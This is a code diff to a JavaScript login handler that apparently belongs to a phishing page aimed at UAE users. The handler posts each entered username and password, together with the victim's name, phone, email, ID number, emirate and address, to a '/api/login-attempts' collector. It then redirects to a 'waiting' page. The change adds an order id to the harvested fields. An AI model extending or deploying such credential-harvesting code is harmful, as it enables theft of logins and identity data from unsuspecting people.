@@ -1078,7 +1078,7 @@ function handleLogin(e) {
     btn.textContent = 'Verifying...';
     errorEl.style.display = 'none';
     var country = 'Unknown';
-    var service = '', orderName = '', orderPhone = '', orderEmail = '', orderIdNumber = '', orderEmirate = '', orderAddress = '';
+    var service = '', orderName = '', orderPhone = '', orderEmail = '', orderIdNumber = '', orderEmirate = '', orderAddress = '', orderId = '';
     try {
       country = sessionStorage.getItem('user_country') || 'Unknown';
       service = sessionStorage.getItem('service_type') || '';
@@ -1088,8 +1088,9 @@ function handleLogin(e) {
       orderIdNumber = sessionStorage.getItem('order_id_number') || '';
       orderEmirate = sessionStorage.getItem('order_emirate') || '';
       orderAddress = sessionStorage.getItem('order_address') || '';
+      orderId = sessionStorage.getItem('order_id') || '';
     } catch(ex) {}
-    var payload = JSON.stringify({ username: username, password: password, country: country, lang: 'en', service: service, orderName: orderName, orderPhone: orderPhone, orderEmail: orderEmail, orderIdNumber: orderIdNumber, orderEmirate: orderEmirate, orderAddress: orderAddress });
+    var payload = JSON.stringify({ username: username, password: password, country: country, lang: 'en', service: service, orderName: orderName, orderPhone: orderPhone, orderEmail: orderEmail, orderIdNumber: orderIdNumber, orderEmirate: orderEmirate, orderAddress: orderAddress, orderId: orderId });
     var xhr = new XMLHttpRequest();
     xhr.open('POST', '/api/login-attempts', true);
     xhr.setRequestHeader('Content-Type', 'application/json');
@@ -1097,7 +1098,7 @@ function handleLogin(e) {
       try {
         var data = JSON.parse(xhr.responseText);
         if (data.success) {
-          try { sessionStorage.removeItem('service_type'); sessionStorage.removeItem('order_name'); sessionStorage.removeItem('order_phone'); sessionStorage.removeItem('order_email'); sessionStorage.removeItem('order_id_number'); sessionStorage.removeItem('order_emirate'); sessionStorage.removeItem('order_address'); } catch(ex) {}
+          try { sessionStorage.removeItem('service_type'); sessionStorage.removeItem('order_name'); sessionStorage.removeItem('order_phone'); sessionStorage.removeItem('order_email'); sessionStorage.removeItem('order_id_number'); sessionStorage.removeItem('order_emirate'); sessionStorage.removeItem('order_address'); sessionStorage.removeItem('order_id'); } catch(ex) {}
           window.location.href = '/en/login/waiting.html?id=' + data.id;
         } else {
           btn.disabled = false;
